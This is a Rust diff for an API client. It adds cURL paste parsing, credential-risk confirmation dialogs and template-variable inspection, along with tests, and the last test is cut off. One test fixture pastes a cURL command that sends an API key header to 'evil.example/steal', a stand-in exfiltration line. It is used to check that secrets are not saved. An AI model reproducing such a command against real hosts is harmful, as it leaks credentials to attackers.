@@ -19,7 +19,10 @@ use gpui_kit::component::{
     alert::Alert,
     button::{Button, ButtonVariant, ButtonVariants as _},
     dialog::DialogButtonProps,
-    input::{EditorState, Input, InputEvent, InputState, Textarea, TextareaState},
+    input::{
+        EditorState, InlineToken, Input, InputContent, InputEvent, InputState, Textarea,
+        TextareaState,
+    },
     menu::{DropdownMenu as _, PopupMenuItem},
     notification::Notification,
     resizable::{h_resizable, resizable_panel, v_resizable},
@@ -155,7 +158,104 @@ impl Render for VariablesSheetView {
 
 pub enum PendingSensitiveImport {
     Collection(import::ImportReport),
-    Curl(ApiRequest, Vec<SensitiveFieldFinding>),
+    Curl(curl::CurlParseReport, Vec<SensitiveFieldFinding>),
+}
+
+fn render_unsupported_curl_flags_alert(id: &'static str, flags: &[String]) -> Alert {
+    Alert::warning(
+        id,
+        format!(
+            "Ignored unsupported flag(s): {}. Fastman cannot emulate these options, so the imported HTTP method, headers, or body may differ from cURL.",
+            flags.join(", ")
+        ),
+    )
+    .title("Unsupported cURL Flags")
+}
+
+fn render_sensitive_choice_panel<V: 'static>(
+    id_prefix: &'static str,
+    source_label: &str,
+    count: usize,
+    summary: &str,
+    choice: usize,
+    on_select: impl Fn(&mut V, usize, &mut Context<V>) + 'static,
+    cx: &mut Context<V>,
+) -> Div {
+    div()
+        .flex()
+        .flex_col()
+        .gap_3()
+        .child(
+            Alert::warning(
+                format!("{id_prefix}-warning"),
+                format!(
+                    "{source_label} contains {count} sensitive field(s): {summary}. Custom headers, query params, and URLs are persisted in plaintext project JSON, while Auth tab fields remain session-only."
+                ),
+            )
+            .title("Plaintext Credential Risk"),
+        )
+        .child(
+            TabBar::new(format!("{id_prefix}-choice"))
+                .segmented()
+                .small()
+                .selected_index(choice)
+                .on_click(cx.listener(move |view, idx, _, cx| {
+                    on_select(view, *idx, cx);
+                }))
+                .child(Tab::new().label("Move / Strip Secrets (Safe)"))
+                .child(Tab::new().label("Keep in Plaintext JSON")),
+        )
+        .child(
+            div()
+                .text_size(px(12.))
+                .text_color(cx.theme().muted_foreground)
+                .child(if choice == 0 {
+                    "Recognized Bearer, Basic, and API key fields move to session-only Auth (not saved to disk); remaining cookies/custom secrets are stripped."
+                } else {
+                    "All imported headers, query params, and URLs will be saved in plaintext to project.json."
+                }),
+        )
+}
+
+pub struct CurlImportConfirmView {
+    pub(super) report: curl::CurlParseReport,
+    pub(super) replace_summary: Option<String>,
+    pub(super) findings_count: usize,
+    pub(super) findings_summary: String,
+    pub(super) choice: usize,
+}
+
+impl Render for CurlImportConfirmView {
+    fn render(&mut self, _window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
+        let mut root = div().flex().flex_col().gap_3();
+        if let Some(replace_summary) = &self.replace_summary {
+            root = root.child(
+                Alert::warning("curl-paste-replace-warning", replace_summary.clone())
+                    .title("Replace Current Request?"),
+            );
+        }
+        if !self.report.unsupported_flags.is_empty() {
+            root = root.child(render_unsupported_curl_flags_alert(
+                "curl-paste-unsupported-flags",
+                &self.report.unsupported_flags,
+            ));
+        }
+        if self.findings_count > 0 {
+            root = root.child(render_sensitive_choice_panel(
+                "curl-paste-sensitive",
+                "This cURL command",
+                self.findings_count,
+                &self.findings_summary,
+                self.choice,
+                |view, idx, cx| {
+                    view.choice = idx;
+                    cx.notify();
+                },
+                cx,
+            ));
+        }
+        root
+    }
 }
 
 pub struct ImportDialogView {
@@ -186,59 +286,56 @@ impl ImportDialogView {
 impl Render for ImportDialogView {
     fn render(&mut self, _window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
         if let Some(pending) = &self.pending_sensitive {
-            let (count, summary, is_curl) = match pending {
-                PendingSensitiveImport::Collection(report) => (
-                    report.sensitive_fields.len(),
-                    summarize_sensitive_findings(&report.sensitive_fields),
-                    false,
-                ),
-                PendingSensitiveImport::Curl(_, findings) => {
-                    (findings.len(), summarize_sensitive_findings(findings), true)
-                }
-            };
-            let source_label = if is_curl {
-                "This cURL command"
-            } else {
-                "This collection"
-            };
-            return div()
-                .flex()
-                .flex_col()
-                .gap_3()
-                .child(
-                    Alert::warning(
-                        "sensitive-import-warning",
-                        format!(
-                            "{source_label} contains {count} sensitive field(s): {summary}. Custom headers, query params, and URLs are persisted in plaintext project JSON, while Auth tab fields remain session-only."
-                        ),
-                    )
-                    .title("Plaintext Credential Risk"),
-                )
-                .child(
-                    TabBar::new("sensitive-import-choice")
-                        .segmented()
-                        .small()
-                        .selected_index(self.sensitive_choice)
-                        .on_click(cx.listener(|view, idx, _, cx| {
-                            view.sensitive_choice = *idx;
+            match pending {
+                PendingSensitiveImport::Collection(report) => {
+                    return render_sensitive_choice_panel(
+                        "sensitive-import",
+                        "This collection",
+                        report.sensitive_fields.len(),
+                        &summarize_sensitive_findings(&report.sensitive_fields),
+                        self.sensitive_choice,
+                        |view, idx, cx| {
+                            view.sensitive_choice = idx;
                             cx.notify();
-                        }))
-                        .child(Tab::new().label("Move / Strip Secrets (Safe)"))
-                        .child(Tab::new().label("Keep in Plaintext JSON")),
-                )
-                .child(
-                    div()
-                        .text_size(px(12.))
-                        .text_color(cx.theme().muted_foreground)
-                        .child(if self.sensitive_choice == 0 {
-                            "Recognized Bearer, Basic, and API key fields move to session-only Auth (not saved to disk); remaining cookies/custom secrets are stripped."
-                        } else {
-                            "All imported headers, query params, and URLs will be saved in plaintext to project.json."
-                        }),
-                )
-                .when_some(self.error.as_ref(), |el, err| {
-                    el.child(Alert::error("import-error", err.clone()).title("Import failed"))
-                });
+                        },
+                        cx,
+                    )
+                    .when_some(self.error.as_ref(), |el, err| {
+                        el.child(Alert::error("import-error", err.clone()).title("Import failed"))
+                    });
+                }
+                PendingSensitiveImport::Curl(report, findings) => {
+                    return div()
+                        .flex()
+                        .flex_col()
+                        .gap_3()
+                        .when(!report.unsupported_flags.is_empty(), |el| {
+                            el.child(render_unsupported_curl_flags_alert(
+                                "import-curl-unsupported-flags",
+                                &report.unsupported_flags,
+                            ))
+                        })
+                        .when(!findings.is_empty(), |el| {
+                            el.child(render_sensitive_choice_panel(
+                                "sensitive-import",
+                                "This cURL command",
+                                findings.len(),
+                                &summarize_sensitive_findings(findings),
+                                self.sensitive_choice,
+                                |view, idx, cx| {
+                                    view.sensitive_choice = idx;
+                                    cx.notify();
+                                },
+                                cx,
+                            ))
+                        })
+                        .when_some(self.error.as_ref(), |el, err| {
+                            el.child(
+                                Alert::error("import-error", err.clone()).title("Import failed"),
+                            )
+                        });
+                }
+            }
         }
 
         let placeholder = if self.mode == 0 {
@@ -343,6 +440,9 @@ pub struct WorkspaceView {
     pub(super) params_active_count: usize,
     pub(super) headers_active_count: usize,
     pub(super) body_json_valid: bool,
+    pub(super) last_url: String,
+    pub(super) active_curl_confirm: Option<WeakEntity<CurlImportConfirmView>>,
+    pub(super) template_inspection: fastman_core::template::RequestTemplateInspection,
     pub(super) explorer_filter_lower: String,
     pub(super) response_tab: usize,
     pub(super) response_raw: bool,
@@ -451,7 +551,19 @@ impl WorkspaceView {
             window,
             |view, _, event, window, cx| match event {
                 InputEvent::PressEnter { .. } => view.send(Some(window), cx),
-                InputEvent::Change if !view.suppress_dirty => view.mark_dirty(cx),
+                InputEvent::Change if !view.suppress_dirty => {
+                    let raw = view.url.read(cx).value().to_string();
+                    let prior_url = std::mem::replace(&mut view.last_url, raw.clone());
+                    let prev_started_curl = prior_url
+                        .trim_start()
+                        .to_ascii_lowercase()
+                        .starts_with("curl");
+                    if !prev_started_curl && curl::looks_like_curl_command(&raw) {
+                        view.try_apply_curl_from_url_bar(&raw, prior_url, view.dirty, window, cx);
+                    } else {
+                        view.mark_dirty(cx);
+                    }
+                }
                 _ => {}
             },
         ));
@@ -543,6 +655,9 @@ impl WorkspaceView {
             params_active_count: 0,
             headers_active_count: 0,
             body_json_valid: true,
+            last_url: String::new(),
+            active_curl_confirm: None,
+            template_inspection: fastman_core::template::RequestTemplateInspection::default(),
             explorer_filter_lower: String::new(),
             response_tab: 0,
             response_raw: false,
@@ -591,7 +706,35 @@ impl WorkspaceView {
         if !self.dirty {
             self.dirty = true;
         }
+        self.refresh_template_inspection(cx);
         cx.notify();
+    }
+
+    pub(super) fn refresh_template_inspection(&mut self, cx: &mut Context<Self>) {
+        if self.selected_id.is_none() {
+            self.template_inspection = fastman_core::template::RequestTemplateInspection::default();
+            return;
+        }
+        let draft = self.snapshot_draft_request(cx);
+        self.template_inspection =
+            fastman_core::template::inspect_request(&draft, &self.current().variables);
+        self.refresh_url_tokens(cx);
+    }
+
+    fn refresh_url_tokens(&mut self, cx: &mut Context<Self>) {
+        let text = self.url.read(cx).value().to_string();
+        let spans = fastman_core::template::find_resolved_spans(&text, &self.current().variables);
+        let mut content = InputContent::new(text.clone());
+        for span in spans {
+            let raw = &text[span.range.clone()];
+            let token = InlineToken::new(format!("var:{}", span.name), raw.to_owned());
+            if let Ok(next) = content.clone().with_token(span.range, token) {
+                content = next;
+            }
+        }
+        self.url.update(cx, |input, cx| {
+            let _ = input.set_tokens(content, cx);
+        });
     }
 
     pub(super) fn refresh_request_count(&mut self) {
@@ -741,6 +884,7 @@ impl WorkspaceView {
                 .append_pair(k, v, window, cx, Self::kv_change_handler(0));
         }
         self.suppress_dirty = true;
+        self.last_url = base.to_owned();
         Self::set_input(&self.url, base, window, cx);
         self.suppress_dirty = false;
         self.refresh_kv_counts(cx);
@@ -814,77 +958,351 @@ impl WorkspaceView {
         cx.notify();
     }
 
+    fn populate_editor_from_request(
+        &mut self,
+        request: ApiRequest,
+        preserve_existing_name: bool,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        self.method = request.method;
+        let current_name = self.request_name.read(cx).value().to_string();
+        let keep_name = preserve_existing_name
+            && !current_name.trim().is_empty()
+            && current_name.trim() != "New Request";
+        if !keep_name {
+            Self::set_input(&self.request_name, request.name, window, cx);
+        }
+        self.last_url = request.url.clone();
+        Self::set_input(&self.url, request.url, window, cx);
+        self.params_table
+            .load(&request.params, window, cx, Self::kv_change_handler(0));
+        self.headers_table
+            .load(&request.headers, window, cx, Self::kv_change_handler(1));
+        match request.body {
+            HttpBody::None => {
+                self.body_kind = 0;
+                Self::set_editor(&self.body_editor, "", window, cx);
+                self.form_table
+                    .load(&[], window, cx, Self::kv_change_handler(2));
+            }
+            HttpBody::Json(text) => {
+                self.body_kind = 1;
+                Self::set_editor(&self.body_editor, text, window, cx);
+                self.form_table
+                    .load(&[], window, cx, Self::kv_change_handler(2));
+            }
+            HttpBody::Text(text) => {
+                self.body_kind = 2;
+                Self::set_editor(&self.body_editor, text, window, cx);
+                self.form_table
+                    .load(&[], window, cx, Self::kv_change_handler(2));
+            }
+            HttpBody::FormUrlEncoded(pairs) => {
+                self.body_kind = 3;
+                Self::set_editor(&self.body_editor, "", window, cx);
+                self.form_table
+                    .load(&pairs, window, cx, Self::kv_change_handler(2));
+            }
+        };
+        Self::set_input(&self.timeout, request.timeout_ms.to_string(), window, cx);
+        self.auth_kind = match &request.auth {
+            Auth::None => 0,
+            Auth::Basic { .. } => 1,
+            Auth::Bearer { .. } => 2,
+            Auth::ApiKeyHeader { .. } => 3,
+            Auth::ApiKeyQuery { .. } => 4,
+        };
+        for field in [
+            &self.auth_user,
+            &self.auth_password,
+            &self.auth_token,
+            &self.api_key_name,
+            &self.api_key_value,
+        ] {
+            Self::set_input(field, "", window, cx);
+        }
+        match request.auth {
+            Auth::Basic { username, password } => {
+                Self::set_input(&self.auth_user, username, window, cx);
+                Self::set_input(&self.auth_password, password, window, cx);
+            }
+            Auth::Bearer { token } => Self::set_input(&self.auth_token, token, window, cx),
+            Auth::ApiKeyHeader { name, value } | Auth::ApiKeyQuery { name, value } => {
+                Self::set_input(&self.api_key_name, name, window, cx);
+                Self::set_input(&self.api_key_value, value, window, cx);
+            }
+            Auth::None => {}
+        }
+    }
+
+    pub(super) fn parse_url_bar_curl(&mut self, window: &mut Window, cx: &mut Context<Self>) {
+        let raw = self.url.read(cx).value().to_string();
+        let saved = self.current_request().cloned();
+        let prior_url = saved.as_ref().map(|r| r.url.clone()).unwrap_or_default();
+        let non_url_dirty = saved.as_ref().map_or_else(
+            || {
+                self.method != "GET"
+                    || !self.params_table.to_key_values(cx).is_empty()
+                    || !self.headers_table.to_key_values(cx).is_empty()
+                    || self.body_kind != 0
+                    || self.auth_kind != 0
+                    || self.timeout.read(cx).value().trim() != "30000"
+            },
+            |req| self.non_url_draft_differs_from_saved(req, cx),
+        );
+        self.try_apply_curl_from_url_bar(&raw, prior_url, non_url_dirty, window, cx);
+    }
+
+    fn non_url_draft_differs_from_saved(&self, saved: &ApiRequest, cx: &App) -> bool {
+        let snap = self.snapshot_draft_request(cx);
+        snap.name != saved.name.trim()
+            || snap.method != saved.method
+            || snap.params != saved.params
+            || snap.headers != saved.headers
+            || snap.body != saved.body
+            || snap.auth != saved.auth
+            || self.timeout.read(cx).value().trim() != saved.timeout_ms.to_string()
+    }
+
+    fn restore_url_state(
+        &mut self,
+        prior_url: String,
+        prior_dirty: bool,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        self.suppress_dirty = true;
+        self.last_url = prior_url.clone();
+        Self::set_input(&self.url, prior_url, window, cx);
+        self.suppress_dirty = false;
+        self.dirty = prior_dirty;
+        self.refresh_template_inspection(cx);
+        cx.notify();
+    }
+
+    fn describe_draft_replacement(
+        &self,
+        prior_url: &str,
+        prior_dirty: bool,
+        cx: &App,
+    ) -> Option<String> {
+        let mut items = Vec::new();
+        if prior_dirty {
+            items.push("unsaved edits");
+        }
+        if !prior_url.trim().is_empty() {
+            items.push("URL");
+        }
+        if self.method != "GET" {
+            items.push("method");
+        }
+        if !self.params_table.to_key_values(cx).is_empty() {
+            items.push("query params");
+        }
+        if !self.headers_table.to_key_values(cx).is_empty() {
+            items.push("headers");
+        }
+        if self.body_kind != 0 {
+            items.push("body");
+        }
+        if self.auth_kind != 0 {
+            items.push("auth");
+        }
+        if self.timeout.read(cx).value().trim() != "30000" {
+            items.push("timeout");
+        }
+        (!items.is_empty()).then(|| {
+            format!(
+                "Applying this cURL command will overwrite your current request ({}).",
+                items.join(", ")
+            )
+        })
+    }
+
+    fn apply_curl_request_to_editor(
+        &mut self,
+        parsed: ApiRequest,
+        notice: Option<String>,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        self.active_curl_confirm = None;
+        let method = parsed.method.clone();
+        let url = parsed.url.clone();
+        let has_session_auth = !matches!(parsed.auth, Auth::None);
+        self.editing_request_name = false;
+        self.suppress_dirty = true;
+        self.populate_editor_from_request(parsed, true, window, cx);
+        self.suppress_dirty = false;
+        self.refresh_kv_counts(cx);
+        self.refresh_body_json_valid(cx);
+        self.mark_dirty(cx);
+
+        let msg = notice.unwrap_or_else(|| {
+            if has_session_auth {
+                format!("Parsed cURL into request: {method} {url} (Auth kept session-only)")
+            } else {
+                format!("Parsed cURL into request: {method} {url}")
+            }
+        });
+        self.set_status(msg.clone(), false, cx);
+        window.push_notification(Notification::success(msg), cx);
+    }
+
+    fn apply_confirmed_curl_view(
+        &mut self,
+        confirm_view: &Entity<CurlImportConfirmView>,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let (mut req, has_findings, choice, unsupported) = {
+            let state = confirm_view.read(cx);
+            (
+                state.report.request.clone(),
+                state.findings_count > 0,
+                state.choice,
+                state.report.unsupported_flags.clone(),
+            )
+        };
+        let summary = (has_findings && choice == 0).then(|| sanitize_request_credentials(&mut req));
+        let notice = Self::format_curl_apply_notice(&req, summary, &unsupported);
+        self.apply_curl_request_to_editor(req, Some(notice), window, cx);
+    }
+
+    fn format_curl_apply_notice(
+        req: &ApiRequest,
+        summary: Option<fastman_core::security::SanitizeSummary>,
+        unsupported: &[String],
+    ) -> String {
+        let mut msg = match summary {
+            Some(s) => format!(
+                "Parsed cURL into request (moved {} to session Auth, stripped {})",
+                s.moved_to_session_auth, s.stripped_fields
+            ),
+            None if !matches!(req.auth, Auth::None) => format!(
+                "Parsed cURL into request: {} {} (Auth kept session-only)",
+                req.method, req.url
+            ),
+            None => format!("Parsed cURL into request: {} {}", req.method, req.url),
+        };
+        if !unsupported.is_empty() {
+            msg.push_str(&format!(" · ignored flags: {}", unsupported.join(", ")));
+        }
+        msg
+    }
+
+    fn open_curl_import_confirm_dialog(
+        &mut self,
+        report: curl::CurlParseReport,
+        replace_summary: Option<String>,
+        findings: Vec<SensitiveFieldFinding>,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let title = if !findings.is_empty() {
+            "Confirm Sensitive Credential Handling"
+        } else if replace_summary.is_some() {
+            "Replace Current Request?"
+        } else {
+            "Confirm cURL Import"
+        };
+        let ok_text = if replace_summary.is_some() {
+            "Replace Request"
+        } else {
+            "Apply cURL"
+        };
+        let confirm_view = cx.new(|_| CurlImportConfirmView {
+            report,
+            replace_summary,
+            findings_count: findings.len(),
+            findings_summary: summarize_sensitive_findings(&findings),
+            choice: 0,
+        });
+        self.active_curl_confirm = Some(confirm_view.downgrade());
+        let weak_workspace = cx.weak_entity();
+        window.open_dialog(cx, move |dialog, _, _| {
+            let confirm_ok = confirm_view.clone();
+            let weak_ok = weak_workspace.clone();
+            dialog
+                .w(px(580.))
+                .title(title)
+                .button_props(
+                    DialogButtonProps::default()
+                        .ok_text(ok_text)
+                        .show_cancel(true),
+                )
+                .on_ok(move |_, window, cx| {
+                    let _ = weak_ok.update(cx, |view, cx| {
+                        view.apply_confirmed_curl_view(&confirm_ok, window, cx);
+                    });
+                    true
+                })
+                .child(confirm_view.clone())
+        });
+    }
+
+    fn try_apply_curl_from_url_bar(
+        &mut self,
+        raw: &str,
+        prior_url: String,
+        prior_dirty: bool,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        if raw.len() > curl::MAX_CURL_IMPORT_BYTES {
+            self.restore_url_state(prior_url, prior_dirty, window, cx);
+            let msg = format!(
+                "cURL command exceeds maximum size ({} bytes).",
+                curl::MAX_CURL_IMPORT_BYTES
+            );
+            self.set_status(msg.clone(), true, cx);
+            window.push_notification(Notification::error(msg), cx);
+            return;
+        }
+        let replace_summary = self.describe_draft_replacement(&prior_url, prior_dirty, cx);
+        match curl::parse_curl_report(raw) {
+            Ok(report) => {
+                let mut findings = Vec::new();
+                collect_sensitive_request_findings(&report.request, &mut findings);
+                if replace_summary.is_some()
+                    || !findings.is_empty()
+                    || !report.unsupported_flags.is_empty()
+                {
+                    // Never stage raw pasted cURL commands/secrets inside the editable draft.
+                    self.restore_url_state(prior_url, prior_dirty, window, cx);
+                    self.open_curl_import_confirm_dialog(
+                        report,
+                        replace_summary,
+                        findings,
+                        window,
+                        cx,
+                    );
+                } else {
+                    self.apply_curl_request_to_editor(report.request, None, window, cx);
+                }
+            }
+            Err(err) => {
+                self.restore_url_state(prior_url, prior_dirty, window, cx);
+                let msg = format!("cURL parse failed: {err:#}");
+                self.set_status(msg.clone(), true, cx);
+                window.push_notification(Notification::error(msg), cx);
+            }
+        }
+    }
+
     fn load_editor(&mut self, window: &mut Window, cx: &mut Context<Self>) {
+        self.active_curl_confirm = None;
         self.editing_request_name = false;
         self.suppress_dirty = true;
         let request = self.current_request().cloned();
         if let Some(request) = request {
-            self.method = request.method;
-            Self::set_input(&self.request_name, request.name, window, cx);
-            Self::set_input(&self.url, request.url, window, cx);
-            self.params_table
-                .load(&request.params, window, cx, Self::kv_change_handler(0));
-            self.headers_table
-                .load(&request.headers, window, cx, Self::kv_change_handler(1));
-            match request.body {
-                HttpBody::None => {
-                    self.body_kind = 0;
-                    Self::set_editor(&self.body_editor, "", window, cx);
-                    self.form_table
-                        .load(&[], window, cx, Self::kv_change_handler(2));
-                }
-                HttpBody::Json(text) => {
-                    self.body_kind = 1;
-                    Self::set_editor(&self.body_editor, text, window, cx);
-                    self.form_table
-                        .load(&[], window, cx, Self::kv_change_handler(2));
-                }
-                HttpBody::Text(text) => {
-                    self.body_kind = 2;
-                    Self::set_editor(&self.body_editor, text, window, cx);
-                    self.form_table
-                        .load(&[], window, cx, Self::kv_change_handler(2));
-                }
-                HttpBody::FormUrlEncoded(pairs) => {
-                    self.body_kind = 3;
-                    Self::set_editor(&self.body_editor, "", window, cx);
-                    self.form_table
-                        .load(&pairs, window, cx, Self::kv_change_handler(2));
-                }
-            };
-            Self::set_input(&self.timeout, request.timeout_ms.to_string(), window, cx);
-            self.auth_kind = match &request.auth {
-                Auth::None => 0,
-                Auth::Basic { .. } => 1,
-                Auth::Bearer { .. } => 2,
-                Auth::ApiKeyHeader { .. } => 3,
-                Auth::ApiKeyQuery { .. } => 4,
-            };
-            for field in [
-                &self.auth_user,
-                &self.auth_password,
-                &self.auth_token,
-                &self.api_key_name,
-                &self.api_key_value,
-            ] {
-                Self::set_input(field, "", window, cx);
-            }
-            match request.auth {
-                Auth::Basic { username, password } => {
-                    Self::set_input(&self.auth_user, username, window, cx);
-                    Self::set_input(&self.auth_password, password, window, cx);
-                }
-                Auth::Bearer { token } => Self::set_input(&self.auth_token, token, window, cx),
-                Auth::ApiKeyHeader { name, value } | Auth::ApiKeyQuery { name, value } => {
-                    Self::set_input(&self.api_key_name, name, window, cx);
-                    Self::set_input(&self.api_key_value, value, window, cx);
-                }
-                Auth::None => {}
-            }
+            self.populate_editor_from_request(request, false, window, cx);
         } else {
             self.method = "GET".into();
             self.auth_kind = 0;
             self.body_kind = 0;
+            self.last_url.clear();
             for field in [
                 &self.url,
                 &self.request_name,
@@ -909,6 +1327,7 @@ impl WorkspaceView {
         self.dirty = false;
         self.refresh_kv_counts(cx);
         self.refresh_body_json_valid(cx);
+        self.refresh_template_inspection(cx);
         self.refresh_response_search_matches(cx);
         self.reset_response_scroll();
         cx.notify();
@@ -1957,6 +2376,7 @@ impl WorkspaceView {
                                     let map = sheet_save.read(cx).variables_map(cx);
                                     let _ = weak_save.update(cx, |view, cx| {
                                         view.projects[view.active_project].variables = map;
+                                        view.refresh_template_inspection(cx);
                                         match view.store.save(view.current()) {
                                             Ok(()) => {
                                                 view.set_status("Variables saved", false, cx);
@@ -2037,7 +2457,7 @@ impl WorkspaceView {
             dialog
                 .w(px(580.))
                 .title(if is_confirm_step {
-                    "Confirm Sensitive Credential Handling"
+                    "Confirm cURL / Collection Import"
                 } else {
                     "Import Collection or cURL"
                 })
@@ -2077,21 +2497,29 @@ impl WorkspaceView {
                                 });
                                 return saved_ok;
                             }
-                            PendingSensitiveImport::Curl(mut req, _) => {
-                                let summary = (choice == 0)
+                            PendingSensitiveImport::Curl(report, findings) => {
+                                let mut req = report.request;
+                                let summary = (!findings.is_empty() && choice == 0)
                                     .then(|| sanitize_request_credentials(&mut req));
                                 let label = format!("{} {}", req.method, req.name);
+                                let unsupported = report.unsupported_flags;
                                 let _ = weak_ok.update(cx, |view, cx| {
                                     view.insert_and_open_request(req, window, cx);
-                                    let msg = match summary {
+                                    let mut note = match summary {
                                         Some(s) => format!(
                                             "Imported cURL: {label} (moved {} to session Auth, stripped {})",
                                             s.moved_to_session_auth, s.stripped_fields
                                         ),
                                         None => format!("Imported cURL: {label}"),
                                     };
-                                    view.set_status(msg.clone(), false, cx);
-                                    window.push_notification(Notification::success(msg), cx);
+                                    if !unsupported.is_empty() {
+                                        note.push_str(&format!(
+                                            " · ignored flags: {}",
+                                            unsupported.join(", ")
+                                        ));
+                                    }
+                                    view.set_status(note.clone(), false, cx);
+                                    window.push_notification(Notification::success(note), cx);
                                 });
                                 return true;
                             }
@@ -2164,19 +2592,20 @@ impl WorkspaceView {
                             });
                             return false;
                         }
-                        match curl::parse_curl(&raw_text) {
-                            Ok(req) => {
+                        match curl::parse_curl_report(&raw_text) {
+                            Ok(report) => {
                                 let mut findings = Vec::new();
-                                collect_sensitive_request_findings(&req, &mut findings);
-                                if !findings.is_empty() {
+                                collect_sensitive_request_findings(&report.request, &mut findings);
+                                if !findings.is_empty() || !report.unsupported_flags.is_empty() {
                                     modal_ok.update(cx, |m, cx| {
                                         m.sensitive_choice = 0;
                                         m.pending_sensitive =
-                                            Some(PendingSensitiveImport::Curl(req, findings));
+                                            Some(PendingSensitiveImport::Curl(report, findings));
                                         cx.notify();
                                     });
                                     return false;
                                 }
+                                let req = report.request;
                                 let label = format!("{} {}", req.method, req.name);
                                 let has_session_auth = !matches!(req.auth, Auth::None);
                                 let _ = weak_ok.update(cx, |view, cx| {
@@ -2744,5 +3173,311 @@ mod tests {
         .unwrap();
         let disk = other_instance.load(&project_id).unwrap();
         assert_eq!(disk.find_request(&request_id).unwrap().url, external_url);
+    }
+
+    #[test]
+    fn pasting_curl_into_url_bar_populates_editor() {
+        run_view_test(check_url_curl_paste);
+    }
+
+    fn check_url_curl_paste() {
+        let mut cx = TestAppContext::single();
+        let root = tempfile::tempdir().unwrap();
+        let store = ProjectStore::at(root.path());
+        seed_request(&store);
+        cx.update(gpui_kit::init);
+        let (window, view) = cx
+            .update(|cx| {
+                gpui_kit::open_window(Default::default(), cx, |window, cx| {
+                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
+                })
+            })
+            .unwrap();
+
+        cx.update_window(window, |_, window, cx| {
+            view.update(cx, |view, cx| {
+                view.url.update(cx, |input, cx| {
+                    input.replace_all(
+                        r#"curl -X POST "https://api.example.com/v1/orders?dry=1" -H "Authorization: Bearer tok_123" -H "X-Trace: abc" -d '{"item":"book"}'"#,
+                        window,
+                        cx,
+                    );
+                });
+            });
+        })
+        .unwrap();
+
+        cx.update_window(window, |_, _, cx| {
+            let v = view.read(cx);
+            assert_eq!(v.method, "POST");
+            assert_eq!(
+                v.url.read(cx).value().as_ref(),
+                "https://api.example.com/v1/orders"
+            );
+            assert_eq!(v.auth_kind, 2);
+            assert_eq!(v.auth_token.read(cx).value().as_ref(), "tok_123");
+            assert_eq!(v.body_kind, 1);
+            assert_eq!(
+                v.body_editor.read(cx).value().as_ref(),
+                r#"{"item":"book"}"#
+            );
+            assert_eq!(v.params_active_count, 1);
+            assert_eq!(v.headers_active_count, 1);
+            assert!(v.dirty);
+        })
+        .unwrap();
+    }
+
+    #[test]
+    fn template_inspection_tracks_missing_vars_and_masks_secrets() {
+        run_view_test(check_template_inspection);
+    }
+
+    fn check_template_inspection() {
+        let mut cx = TestAppContext::single();
+        let root = tempfile::tempdir().unwrap();
+        let store = ProjectStore::at(root.path());
+        let mut project = store.create("Vars project").unwrap();
+        project
+            .variables
+            .insert("host".into(), "https://api.example.com".into());
+        project
+            .variables
+            .insert("api_token".into(), "secret_xyz".into());
+        let mut req = ApiRequest::new(
+            "GET",
+            "Users",
+            "{{host}}/users?token={{api_token}}&env={{missing_env}}",
+        );
+        req.headers
+            .push(fastman_core::KeyValue::new("X-Tenant", "{{tenant_id}}"));
+        project.collections[0].requests.push(req);
+        store.save(&project).unwrap();
+
+        cx.update(gpui_kit::init);
+        let (window, view) = cx
+            .update(|cx| {
+                gpui_kit::open_window(Default::default(), cx, |window, cx| {
+                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
+                })
+            })
+            .unwrap();
+
+        cx.update_window(window, |_, _, cx| {
+            let v = view.read(cx);
+            assert!(v.template_inspection.url_has_templates);
+            assert_eq!(v.template_inspection.url_resolved_count, 2);
+            assert_eq!(
+                v.template_inspection.url_preview,
+                "https://api.example.com/users?token=••••&env={{missing_env}}"
+            );
+            assert_eq!(
+                v.template_inspection.missing_variables,
+                vec!["missing_env".to_string(), "tenant_id".to_string()]
+            );
+            let url_tokens: Vec<String> = v
+                .url
+                .read(cx)
+                .tokens()
+                .iter()
+                .map(|span| span.token().text().to_string())
+                .collect();
+            assert_eq!(url_tokens, vec!["{{host}}", "{{api_token}}"]);
+        })
+        .unwrap();
+    }
+
+    #[test]
+    fn curl_paste_with_credentials_stages_outside_draft_and_cancel_then_save_preserves_prior_request()
+     {
+        run_view_test(check_curl_paste_cancel_then_save);
+    }
+
+    fn check_curl_paste_cancel_then_save() {
+        let mut cx = TestAppContext::single();
+        let root = tempfile::tempdir().unwrap();
+        let store = ProjectStore::at(root.path());
+        let mut project = store.create("Original Project").unwrap();
+        let mut original = ApiRequest::new("POST", "Save Me", "https://example.com/original");
+        original
+            .headers
+            .push(fastman_core::KeyValue::new("X-Keep", "1"));
+        original.body = fastman_core::HttpBody::Json(r#"{"keep":true}"#.into());
+        original.timeout_ms = 5_000;
+        let project_id = project.id.clone();
+        let request_id = original.id.clone();
+        project.collections[0].requests.push(original);
+        store.save(&project).unwrap();
+
+        cx.update(gpui_kit::init);
+        let (window, view) = cx
+            .update(|cx| {
+                gpui_kit::open_window(Default::default(), cx, |window, cx| {
+                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
+                })
+            })
+            .unwrap();
+
+        cx.update_window(window, |_, window, cx| {
+            view.update(cx, |view, cx| {
+                view.url.update(cx, |input, cx| {
+                    input.replace_all(
+                        r#"curl -H "X-Api-Key: secret-canary" https://evil.example/steal"#,
+                        window,
+                        cx,
+                    );
+                });
+            });
+        })
+        .unwrap();
+
+        cx.update_window(window, |_, _, cx| {
+            view.update(cx, |view, cx| {
+                assert_eq!(
+                    view.url.read(cx).value().as_ref(),
+                    "https://example.com/original"
+                );
+                assert!(!view.dirty);
+                assert_eq!(view.method, "POST");
+                assert_eq!(view.body_kind, 1);
+                assert_eq!(view.headers_active_count, 1);
+                let confirm = view
+                    .active_curl_confirm
+                    .as_ref()
+                    .and_then(|w| w.upgrade())
+                    .expect("confirmation dialog should be staged");
+                assert_eq!(confirm.read(cx).findings_count, 1);
+                assert!(confirm.read(cx).replace_summary.is_some());
+
+                // Saving without confirming (e.g. after Cancel) must never persist pasted secrets.
+                view.save(cx).unwrap();
+            });
+        })
+        .unwrap();
+
